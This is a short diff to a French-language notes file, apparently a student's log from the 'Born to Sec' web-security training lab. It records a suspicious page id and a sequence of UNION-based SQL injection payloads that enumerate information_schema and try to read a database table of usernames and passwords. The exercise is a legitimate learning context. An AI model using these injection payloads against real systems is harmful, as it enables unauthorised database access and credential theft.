@@ -48,3 +48,20 @@ FAIL FOUND ::
 
 
 [13] Quand on click sur le logo Born to Sec, une page s'ouvre avec comme url : http://192.168.9.128/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c l'id ressemble beaucoup a un flag mais je suis pas sur 
+
+
+
+
+
+
+
+
+[14] :
+ 
+	- 1 union select table_schema,table_name from information_schema.table, on voit une db MEMBER_BRUT_FORCE contenant une table db_default
+
+	- 1 union select null,group_concat(column_name) from information_schema.columns where table_name = 0x64625f64656661756c74, il y a id,username,password
+
+	- 1 union select title,comment from Member_Brut_Force.db_default
+
+	- SELECT command denied to user 'borntosec'@'localhost' for table 'db_default
